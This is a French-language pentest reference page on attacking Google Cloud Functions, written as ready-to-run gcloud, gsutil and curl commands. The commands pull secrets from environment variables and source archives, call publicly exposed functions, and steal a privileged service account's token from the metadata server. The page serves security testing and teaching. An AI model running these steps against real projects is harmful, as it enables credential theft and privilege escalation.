---
title: "Cloud Functions : code source, environnement et compte de service d'exécution"
order: 1
description: "Attaquer Cloud Functions : lire le code source et les variables d'environnement, l'invocation non authentifiée et l'abus du compte de service d'exécution de la fonction."
keywords:
  - Cloud Functions
  - compte de service d'exécution
  - variables d'environnement
  - code source
  - invocation
---

# Cloud Functions

Une Cloud Function s'exécute avec un **compte de service d'exécution** et détient souvent des secrets dans ses variables d'environnement et son code source. Avec un accès en lecture, vous récupérez les deux ; avec un accès en déploiement, vous exécutez du code en tant que compte de la fonction, ce qui constitue le chemin d'élévation par [actAs](../identity/privilege-escalation/index.md) lorsque ce compte est plus privilégié que le vôtre.

## Lire le code source, l'environnement et la configuration

```bash
gcloud functions describe <fn> --gen2 --region <r> \
  --format='value(serviceConfig.serviceAccountEmail, serviceConfig.environmentVariables)'
# download the deployed source archive
gcloud functions describe <fn> --gen2 --region <r> --format='value(buildConfig.source.storageSource)'
gsutil cp gs://<source-bucket>/<object> src.zip && unzip -o src.zip -d src/
grep -rinE 'secret|password|token|key' src/
```

## Invocation non authentifiée

```bash
# a function deployed with the public invoker binding is reachable without creds
gcloud functions call <fn> --gen2 --region <r> --data '{}'
curl -s https://<region>-<project>.cloudfunctions.net/<fn>
```

## Exécuter en tant que compte de service d'exécution

```bash
# deploy or update with an attached SA; code then reads its token from the metadata server
gcloud functions deploy <fn> --gen2 --region <r> --runtime python312 \
  --run-service-account <privileged-sa>@<proj>.iam.gserviceaccount.com \
  --trigger-http --allow-unauthenticated --source .
# inside the function:
# curl -H 'Metadata-Flavor: Google' \
#   'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'
```

## Notes d'exploitation

- Déployer ou mettre à jour une fonction nécessite `iam.serviceAccounts.actAs` sur le compte de service d'exécution ; cette combinaison est le chemin d'élévation de privilèges (voir [élévation de privilèges](../identity/privilege-escalation/index.md)).
- Une liaison d'invocateur public `allUsers`/`allAuthenticatedUsers` expose la fonction sans identifiants ; énumérez-la avec `gcloud functions get-iam-policy`.
- La gen1 et la gen2 diffèrent : les fonctions gen2 reposent sur Cloud Run, de sorte que `--run-service-account` et les contrôles Cloud Run s'appliquent.

## Outils

- **gcloud** (`functions deploy`, `describe`, `call`, `get-iam-policy`).
- **gsutil** : récupérer l'archive du code source depuis son bucket de staging.

## Références

- [HackTricks Cloud : GCP Cloud Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs : élévation de privilèges GCP](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Google : comptes de service Cloud Functions](https://cloud.google.com/functions/docs/securing/function-identity)
